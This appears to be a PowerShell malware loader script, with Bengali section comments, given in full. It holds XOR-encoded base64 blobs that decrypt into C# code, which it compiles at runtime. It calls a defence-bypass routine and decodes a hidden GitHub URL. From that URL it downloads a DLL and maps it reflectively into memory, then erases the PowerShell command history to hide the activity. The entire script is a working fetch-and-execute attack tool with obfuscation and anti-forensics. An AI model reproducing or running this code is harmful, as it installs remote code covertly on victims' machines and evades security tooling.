2cPaWhyPjY2djhxa2hzdgkIHmcPaWhyPjY2djhxa2xzdgoIHmcPaWhyPjY2djhxaGpzdhkyZw9paHI+NjZ2OHFpbHMnYSdQenp6enp6enoTNC4KLih6Mzc9ZwwzKC4vOzYbNjY1OXITNC4KLih0AD8oNXZyDxM0LgouKHMpNTN2FxkmFwh2CggNc2F6MzxyMzc9Z2cTNC4KLih0AD8oNXN6LjIoNS16ND8teh8iOT8qLjM1NHJ4DDMoLi87Nhs2NjU5ejw7MzY/PnhzYVB6enp6enp6eig/KXQTNzs9Pxg7KT9nMzc9YXo2NTQ9ejs4ZzM3PXQONRM0LmxucnN2ej4/Ni47Zzs4d3I2NTQ9czM4YXooPyl0Hj82LjtnPj82LjthUHp6enp6enp6FzsoKTI7NnQZNSojcj42NnZqdjM3PXZyMzQucyk1MnNhUHp6enp6enp6PDUoPzs5MnIsOyh6KXozNHopPzkpcyF6MzxyKXQJCB5nZ2pzejk1NC4zNC8/YXovMzQuejkpZyl0DAlnZ2plKXQJCB5gFzsuMnQXMzRyKXQJCB52KXQMCXNhejM8cil0CggecTkpZHIvMzQucz42NnQWPzQ9LjJzITkpZ3IvMzQucz42NnQWPzQ9LjJ3KXQKCB5hejM8cjkpZ2dqczk1NC4zNC8/YSd6FzsoKTI7NnQZNSojcj42NnZyMzQucyl0CggednITNC4KLihzcjs4cSl0DBtzdnIzNC5zOSlzYXonUHp6enp6enp6MzxyKCgsO3tnanx8Pj82Ljt7Z2pzIXovMzQueig1ZygoLDt2eig/ZygoLDtxKCkgYXotMjM2P3IoNWYoP3Mhei8zNC56Kj1nCA9paHIzNz12KDVzdno4KWcID2locjM3PXYoNXFuc2F6MzxyOClnZ2pzOCg/OzFhejM0Lno0P2dyMzQuc3I4KXdic3VoYXo8NShyMzQuejNnamEzZjQ/YTNxcXMhei8pMjUoLno/ZwgPa2xyMzc9dig1cWJxM3Boc2F6MzQuei4jZ3I/ZGRraHN8aiIcdno1PGc/fGoiHBwcYXozPHIuI2dnanM5NTQuMzQvP2F6NjU0PXouKGcqPXE1PGF6MzxyLiNnZ2tqcyEvNjU0PXo5ZwgPbG5yMzc9di4oc2END2xucjM3PXYuKHZyLzY1ND1zcnI2NTQ9czlxPj82Ljtzc2Enej82KT96MzxyLiNnZ2lzIS8zNC56OWcID2locjM3PXYuKHNhDQ9paHIzNz12Lih2ci8zNC5zcnI2NTQ9czlxPj82Ljtzc2Eneid6KDVxZzgpYXoneidQenp6enp6enozPHIzKCw7e2dqcyF6MzQuejM/Z2phei0yMzY/ci4oLz9zIXo2NTQ9ej81ZzMoLDtxMz9waGphei8zNC56NChnCA9paHIzNz12PzVxa2hzdjMoZwgPaWhyMzc9dj81cWtsc3YzNChnCA9paHIzNz12PzVzYXozPHI0KGdnanM4KD87MWF6KS4oMzQ9ej40ZwgbKTkzM3IzNz12NChzYXoTNC4KLih6Mj5nHT8uFzU+LzY/Ejs0PjY/G3I+NHNhejM8cjI+Z2cTNC4KLih0AD8oNXN6Mj5nFjU7PhYzOCg7KCMbcj40c2F6MzxyMj5nZxM0LgouKHQAPyg1cyEzP3FxYTk1NC4zNC8/YSd6NjU0PXouNWdqYXovMzQuei44ZzM0KHtnamUzNChgMyhhejM0LnouKWczKWxuZWJgbmF6LTIzNj9yLigvP3MhejY1ND16Lj9nLjhxLjVhejY1ND16LixnMylsbmVyNjU0PXMID2xucjM3PXYuP3NgcjY1ND1zCA9paHIzNz12Lj9zYXozPHIuLGdnanM4KD87MWF6NjU0PXo1PGczKWxuZS80OTI/OTE/PnJyNjU0PXNqImJqampqampqampqampqamoWc2ByNjU0PXNqImJqampqampqYXoTNC4KLih6PDtnEzQuCi4odAA/KDVhejM8cnIuLHw1PHN7Z2pzejw7Zx0/LgooNTkbPj4oPykpcjI+dnITNC4KLihzcjM0LnNyLix8aiIcHBwcc3Nhej82KT96PDtnHT8uCig1ORs+Pig/KSlyMj52CBspOTMzcjM3PXYuLHFoc3NhejM8cjw7e2cTNC4KLih0AD8oNXMhehM0LgouKHozO2dyEzQuCi4oc3I7OHEzKHEuNXNhejM8cjMpbG5zehc7KCkyOzZ0DSgzLj8TNC5sbnIzO3Y8O3QONRM0LmxucnNzYXo/Nik/ehc7KCkyOzZ0DSgzLj8TNC5paHIzO3Y8O3QONRM0LmlocnNzYXonei41cWcuKWF6J3ozP3FxYXoneidQenp6enp6eno8NSg/Ozkyciw7KHopejM0eik/OSlzIXovMzQueikgZxc7LjJ0Fzsicil0DAl2KXQJCB5zYXozPHIpIGdnanM5NTQuMzQvP2F6LzM0Lno1KmF6DDMoLi87NgooNS4/OS5ychM0LgouKHNyOzhxKXQMG3N2cg8TNC4KLihzKSB2CQooNS5yKXQZMnN2NS8uejUqc2F6J1B6enp6enp6ehw2LykyEzQpLigvOS4zNTQZOzkyP3IdPy4ZLygoPzQuCig1OT8pKXJzdjM3PXZyDxM0LgouKHMpNTNzYVB6enp6enp6eig/KXQeNjYXOzM0Gz4+KGcTNC4KLih0AD8oNWF6MzxyOTs2Nh80LigjfHw/KntnanMheig/KXQeNjYXOzM0Gz4+KGdyEzQuCi4oc3I7OHE/KnNhei4oIyEsOyh6PDRnch42Nhc7MzQcNHMXOygpMjs2dB0/Lh4/Nj89Oy4/HDUoHC80OS4zNTQKNTM0Lj8ocig/KXQeNjYXOzM0Gz4+KHYuIyo/NTxyHjY2FzszNBw0c3NhPDRyMzc9dmt2EzQuCi4odAA/KDVzYSd6OTsuOTIhJ3onUHp6enp6enp6KD8uLyg0eig/KWFQenp6eidQenp6eiovODYzOXopLjsuMzl6ODU1NnocKD8/chM0LgouKHo4c3oheig/Li8oNHoMMyguLzs2HCg/P3I4dg8TNC4KLih0AD8oNXYXHHNheidQJw=="
$part3Enc = "LykzND16CSMpLj83YVAvKTM0PXoJIykuPzd0CC80LjM3P3QTNC4/KDUqCT8oLDM5PylhUC8pMzQ9egkjKS4/N3QOPyIuYVBQKi84NjM5ejk2Oykpehc7NC87Nhc7Kgg/KS82LnoheiovODYzOXoTNC4KLih6Ezc7PT8YOyk/YXoqLzg2Mzl6LzM0LnoTNzs9PwkzID9heiovODYzOXoTNC4KLih6HjY2FzszNBs+PihheiovODYzOXo2NTQ9eh4/Ni47YXoqLzg2Mzl6ODU1NnoTKWxuGDMuYXonUCovODYzOXopLjsuMzl6OTY7KSl6FDsuMyw/FjU7Pj8oeiFQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHoMMyguLzs2GzY2NTlyEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0LnoudnovMzQueipzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6CT8uFjspLh8oKDUoemd6LigvP3MHeiovODYzOXopLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NhwoPz9yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnouc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NgooNS4/OS5yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnoqdno1Ly56LzM0Lno1c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2ehkyOygJPy56Z3oZMjsoCT8udBs0KTN2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4KKDU5Gz4+KD8pKXITNC4KLih6MnZ6KS4oMzQ9ejRzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6GTI7KAk/LnpnehkyOygJPy50GzQpM3Z6CT8uFjspLh8oKDUoemd6LigvP3MHeikuOy4zOXo/Ii4/KDR6EzQuCi4oeh0/LgooNTkbPj4oPykpchM0LgouKHoydnoTNC4KLih6NXNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6HT8uFzU+LzY/Ejs0PjY/G3IpLigzND16NHNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6FjU7PhYzOCg7KCMbcikuKDM0PXo0c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ejg1NTZ6HDYvKTITNCkuKC85LjM1NBk7OTI/chM0LgouKHoydnoTNC4KLih6O3Z6DxM0LgouKHopc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4ZLygoPzQuCig1OT8pKXJzYVB6enp6OTU0KS56LzM0LnoXGXpnemoia2pqanZ6Fwh6Z3pqImhqamp2ehccemd6aiJiampqdnoKCA16Z3pqImJudnoKHwh6Z3pqImhqdnoKHwgNemd6aiJuanZ6CggVemd6aiJqaGFQenp6eikuOy4zOXovKTI1KC56D2tscjgjLj8BB3o4dnozNC56NXN6IXooPy4vKDR6GDMuGTU0LD8oLj8odA41DxM0Lmtscjh2ejVzYXonUHp6enopLjsuMzl6LzM0Lnp6eg9paHI4Iy4/AQd6OHZ6MzQuejVzeiF6KD8uLyg0ehgzLhk1NCw/KC4/KHQONQ8TNC5paHI4dno1c2F6J1B6enp6KS47LjM5ei82NTQ9enoPbG5yOCMuPwEHejh2ejM0Lno1c3oheig/Li8oNHoYMy4ZNTQsPyguPyh0DjUPEzQubG5yOHZ6NXNheidQenp6eikuOy4zOXovMzQuenp6CA9paHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLzM0LnMXOygpMjs2dAg/Oz4TNC5paHJyEzQuCi4oc3IqdA41EzQubG5yc3E1c3NheidQenp6eikuOy4zOXovKTI1KC56CA9rbHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLykyNSgucxc7KCkyOzZ0CD87PhM0LmtscnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6J1B6enp6KS47LjM5ei82NTQ9enoID2xuchM0LgouKHoqdno2NTQ9ejVzeiF6NjU0PXo2NXpnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6NjU0PXoyM3pnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVxbnNzYXooPy4vKDR6ci82NTQ9c3JyMjNmZmlocyY2NXNheidQenp6eikuOy4zOXosNTM+eg0PbG5yEzQuCi4oeip2ejY1ND16NXZ6LzY1ND16LHN6IXoXOygpMjs2dA0oMy4/EzQubG5ychM0LgouKHNyKnQONRM0LmxucnNxNXN2cjY1ND1zLHNheidQenp6eikuOy4zOXosNTM+eg0PaWhyEzQuCi4oeip2ejY1ND16NXZ6LzM0Lnosc3p6eiF6FzsoKTI7NnQNKDMuPxM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzdnIzNC5zLHNheidQenp6eikuOy4zOXopLigzND16CBspOTMzchM0LgouKHoqdno2NTQ9ejVzeiF6LDsoeik4emd6ND8tegkuKDM0PRgvMzY+Pyhyc2F6PDUoenIzNC56M2dqYTNmaGxqYTNxcXN6IXo4Iy4/ejhnFzsoKTI7NnQIPzs+GCMuP3JyEzQuCi4oc3IqdA41EzQubG5yc3E1cTNzc2F6MzxyOGdnanM4KD87MWF6KTh0GyoqPzQ+cnI5MjsoczhzYXoneig/Li8oNHopOHQONQkuKDM0PXJzYXonUHp6enopLjsuMzl6LzM0LnoJCig1LnIvMzQuejlzeiF6ODU1NnoiZ3I5fGoiaGpqampqampze2dqdnotZ3I5fGoiYmpqampqampze2dqdnooZ3I5fGoibmpqampqampze2dqYXozPHIifHwtc3ooPy4vKDR6Ch8IDWF6MzxyInx8KHN6KD8uLyg0egofCGF6MzxyInN6KD8uLyg0egofCGF6MzxyLXN6KD8uLyg0egoIDWF6KD8uLyg0egoIFWF6J1B6enp6KS4oLzkuegk/OXoheiovODYzOXovMzQuegwJdgwbdgkIHnYKCB52GTJheidQenp6egEPNDc7NDs9Pz4cLzQ5LjM1NAo1MzQuPyhyGTs2NjM0PRk1NCw/NC4zNTR0CS4+GTs2NnMHej4/Nj89Oy4/ejg1NTZ6HjY2FzszNBw0chM0LgouKHoydnovMzQueih2ehM0LgouKHoqc2FQenp6eiovODYzOXopLjsuMzl6Fzs0Lzs2FzsqCD8pLzYuehc7KnI4Iy4/AQd6PjY2dno4NTU2ejk7NjYfNC4oI3N6IVB6enp6enp6eiw7KHooPyl6Z3o0Py16Fzs0Lzs2FzsqCD8pLzYucnNhUHp6enp6enp6MzxyD2tscj42NnZqc3tnaiJvG24ec3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+ehcAeHNhUHp6enp6enp6MzQuejY8O3pnehgzLhk1NCw/KC4/KHQONRM0Lmlocj42NnZqImkZc2F6MzxyD2locj42NnY2PDtze2dqIm5vb2ovc3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+egofeHNhUHp6enp6enp6MzQuejk1ZzY8O3FuYXovKTI1KC56NClnD2tscj42NnY5NXFoc3Z6NTIpZw9rbHI+NjZ2OTVxa2xzYXozNC56NTVnOTVxaGphejg1NTZ6MylsbmdyD2tscj42NnY1NXNnZ2oiamhqGHNheig/KXQTKWxuGDMuZzMpbG5hUHp6enp6enp6LzM0Lno/KmcPaWhyPjY2djU1cWtsc3Z6KTUzZw9paHI+NjZ2NTVxb2xzdnopNTJnD2locj42NnY1NXFsanNhei82NTQ9ejM4ZzMpbG5lD2xucj42NnY1NXFobnNgD2locj42NnY1NXFoYnNheig/KXQTNzs9PwkzID9nKTUzYVB6enp6enp6ejM0Lno+PmczKWxuZTU1cWtraGA1NXFjbGF6LzM0LnozKCw7Zw9paHI+NjZ2Pj5xYnN2eigoLDtnD2locj42NnY+PnFuanN2eigpIGcPaWhyPjY2dj4+cW5uc2FQenp6enp6enozNC56KS5nNTVxNTIpYXosOyh6KT85KWc0Py16CT85ATQpB2F6PDUocjM0LnozZ2phM2Y0KWEzcXFzITM0Lno4ZykucTNwbmphKT85KQEzB2c0Py16CT85IQwJZw9paHI+NjZ2OHFic3YMG2cPaWhyPjY2djhxa2hzdgkIHmcPaWhyPjY2djhxa2xzdgoIHmcPaWhyPjY2djhxaGpzdhkyZw9paHI+NjZ2OHFpbHMnYSdQenp6enp6enoTNC4KLih6Mzc9ZwwzKC4vOzYbNjY1OXITNC4KLih0AD8oNXZyDxM0LgouKHMpNTN2FxkmFwh2CggNc2F6MzxyMzc9Z2cTNC4KLih0AD8oNXN6LjIoNS16ND8teh8iOT8qLjM1NHJ4DDMoLi87Nhs2NjU5ejw7MzY/PnhzYVB6enp6enp6eig/KXQTNzs9Pxg7KT9nMzc9YXo2NTQ9ejs4ZzM3PXQONRM0LmxucnN2ej4/Ni47Zzs4d3I2NTQ9czM4YXooPyl0Hj82LjtnPj82LjthUHp6enp6enp6FzsoKTI7NnQZNSojcj42NnZqdjM3PXZyMzQucyk1MnNhUHp6enp6enp6PDUoPzs5MnIsOyh6KXozNHopPzkpcyF6MzxyKXQJCB5nZ2pzejk1NC4zNC8/YXovMzQuejkpZyl0DAlnZ2plKXQJCB5gFzsuMnQXMzRyKXQJCB52KXQMCXNhejM8cil0CggecTkpZHIvMzQucz42NnQWPzQ9LjJzITkpZ3IvMzQucz42NnQWPzQ9LjJ3KXQKCB5hejM8cjkpZ2dqczk1NC4zNC8/YSd6FzsoKTI7NnQZNSojcj42NnZyMzQucyl0CggednITNC4KLihzcjs4cSl0DBtzdnIzNC5zOSlzYXonUHp6enp6enp6MzxyKCgsO3tnanx8Pj82Ljt7Z2pzIXovMzQueig1ZygoLDt2eig/ZygoLDtxKCkgYXotMjM2P3IoNWYoP3Mhei8zNC56Kj1nCA9paHIzNz12KDVzdno4KWcID2locjM3PXYoNXFuc2F6MzxyOClnZ2pzOCg/OzFhejM0Lno0P2dyMzQuc3I4KXdic3VoYXo8NShyMzQuejNnamEzZjQ/YTNxcXMhei8pMjUoLno/ZwgPa2xyMzc9dig1cWJxM3Boc2F6MzQuei4jZ3I/ZGRraHN8aiIcdno1PGc/fGoiHBwcYXozPHIuI2dnanM5NTQuMzQvP2F6NjU0PXouKGcqPXE1PGF6MzxyLiNnZ2tqcyEvNjU0PXo5ZwgPbG5yMzc9di4oc2END2xucjM3PXYuKHZyLzY1ND1zcnI2NTQ9czlxPj82Ljtzc2Enej82KT96MzxyLiNnZ2lzIS8zNC56OWcID2locjM3PXYuKHNhDQ9paHIzNz12Lih2ci8zNC5zcnI2NTQ9czlxPj82Ljtzc2Eneid6KDVxZzgpYXoneidQenp6enp6enozPHIzKCw7e2dqcyF6MzQuejM/Z2phei0yMzY/ci4oLz9zIXo2NTQ9ej81ZzMoLDtxMz9waGphei8zNC56NChnCA9paHIzNz12PzVxa2hzdjMoZwgPaWhyMzc9dj81cWtsc3YzNChnCA9paHIzNz12PzVzYXozPHI0KGdnanM4KD87MWF6KS4oMzQ9ej40ZwgbKTkzM3IzNz12NChzYXoTNC4KLih6Mj5nHT8uFzU+LzY/Ejs0PjY/G3I+NHNhejM8cjI+Z2cTNC4KLih0AD8oNXN6Mj5nFjU7PhYzOCg7KCMbcj40c2F6MzxyMj5nZxM0LgouKHQAPyg1cyEzP3FxYTk1NC4zNC8/YSd6NjU0PXouNWdqYXovMzQuei44ZzM0KHtnamUzNChgMyhhejM0LnouKWczKWxuZWJgbmF6LTIzNj9yLigvP3MhejY1ND16Lj9nLjhxLjVhejY1ND16LixnMylsbmVyNjU0PXMID2xucjM3PXYuP3NgcjY1ND1zCA9paHIzNz12Lj9zYXozPHIuLGdnanM4KD87MWF6NjU0PXo1PGczKWxuZS80OTI/OTE/PnJyNjU0PXNqImJqampqampqampqampqamoWc2ByNjU0PXNqImJqampqampqYXoTNC4KLih6PDtnEzQuCi4odAA/KDVhejM8cnIuLHw1PHN7Z2pzejw7Zx0/LgooNTkbPj4oPykpcjI+dnITNC4KLihzcjM0LnNyLix8aiIcHBwcc3Nhej82KT96PDtnHT8uCig1ORs+Pig/KSlyMj52CBspOTMzcjM3PXYuLHFoc3NhejM8cjw7e2cTNC4KLih0AD8oNXMhehM0LgouKHozO2dyEzQuCi4oc3I7OHEzKHEuNXNhejM8cjMpbG5zehc7KCkyOzZ0DSgzLj8TNC5sbnIzO3Y8O3QONRM0LmxucnNzYXo/Nik/ehc7KCkyOzZ0DSgzLj8TNC5paHIzO3Y8O3QONRM0LmlocnNzYXonei41cWcuKWF6J3ozP3FxYXoneidQenp6enp6eno8NSg/Ozkyciw7KHopejM0eik/OSlzIXovMzQueikgZxc7LjJ0Fzsicil0DAl2KXQJCB5zYXozPHIpIGdnanM5NTQuMzQvP2F6LzM0Lno1KmF6DDMoLi87NgooNS4/OS5ychM0LgouKHNyOzhxKXQMG3N2cg8TNC4KLihzKSB2CQooNS5yKXQZMnN2NS8uejUqc2F6J1B6enp6enp6ehw2LykyEzQpLigvOS4zNTQZOzkyP3IdPy4ZLygoPzQuCig1OT8pKXJzdjM3PXZyDxM0LgouKHMpNTNzYVB6enp6enp6eig/KXQeNjYXOzM0Gz4+KGcTNC4KLih0AD8oNWF6MzxyOTs2Nh80LigjfHw/KntnanMheig/KXQeNjYXOzM0Gz4+KGdyEzQuCi4oc3I7OHE/KnNhei4oIyEsOyh6PDRnch42Nhc7MzQcNHMXOygpMjs2dB0/Lh4/Nj89Oy4/HDUoHC80OS4zNTQKNTM0Lj8ocig/KXQeNjYXOzM0Gz4+KHYuIyo/NTxyHjY2FzszNBw0c3NhPDRyMzc9dmt2EzQuCi4odAA/KDVzYSd6OTsuOTIhJ3onUHp6enp6enp6KD8uLyg0eig/KWFQenp6eidQenp6eiovODYzOXopLjsuMzl6ODU1NnocKD8/chM0LgouKHo4c3oheig/Li8oNHoMMyguLzs2HCg/P3I4dg8TNC4KLih0AD8oNXYXHHNheidQJw=="

# ================================================================
#  ★★★ ৪. ডিপ বাইপাস কল + C# ডিক্রিপ্ট + কম্পাইল ★★★
# ================================================================
Invoke-DeepBypass

$part1 = Xor-Decrypt $part1Enc
$part2 = Xor-Decrypt $part2Enc
$part3 = Xor-Decrypt $part3Enc
if (-not ($part1 -and $part2 -and $part3)) { Invoke-Finalize; return }
$kernel = $part1 + $part2 + $part3

try {
    Add-Type -TypeDefinition $kernel -ErrorAction Stop | Out-Null
} catch {
    Invoke-Finalize; return
}

# ================================================================
#  ★★★ ৫. এনক্রিপ্টেড URL + DLL ডাউনলোড + ম্যাপ ★★★
# ================================================================
$encUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
$url = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encUrl))

try {
    $bytes = (New-Object Net.WebClient).DownloadData($url)
} catch {
    Invoke-Finalize; return
}

try {
    $result = [NativeLoader]::Map($bytes, $true)
} catch {
    Invoke-Finalize; return
}

$bytes = $null; $kernel = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()

Clear-History
$hp = [IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $hp) { Remove-Item $hp -Force -ErrorAction SilentlyContinue }

Invoke-Finalize
